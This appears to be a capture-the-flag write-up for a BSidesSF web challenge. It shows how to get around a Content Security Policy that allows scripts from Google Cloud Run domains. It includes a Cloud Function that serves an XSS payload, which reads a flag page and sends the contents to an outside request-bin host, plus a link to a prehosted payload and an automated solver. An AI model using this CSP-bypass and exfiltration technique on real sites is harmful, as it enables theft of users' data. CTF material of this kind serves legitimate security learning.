The CSP allows us to source Javascript files from `*.us-central1.run.app`. 
`` default-src 'self'; 
   script-src 'self' '*.us-central1.run.app';
   connect-src *; 
   style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com; 
   font-src 'self' fonts.gstatic.com fonts.googleapis.com ``

This is the domain used by Google Cloud Run and Cloud Functions. So you can deploy a function to return Javascript code. 
``` 
def serveIt(request):
   
    request_json = request.get_json(silent=True)
    request_args = request.args

    if request_json and 'name' in request_json:
        name = request_json['name']
    elif request_args and 'name' in request_args:
        name = request_args['name']
    else:
        name = 'World'

    return """  
            var xhr = new XMLHttpRequest();
            xhr.open('GET',location.origin + '/xss-two-flag',true);
            xhr.onload = function () {
                var request = new XMLHttpRequest();
                request.open('GET','<REQUEST_BIN_URL>?flag=' + xhr.responseText,true);
                request.send()};
            xhr.send(null);
    """ 
 ```

 You can use the prehosted script at `<script src="https://javascript-server-808630243113.us-central1.run.app"> </script>` to test the challenge. 

 Or use the automated solution, `python3 server.py https://web-tutorial-2-4b27d232.challenges.bsidessf.net`. 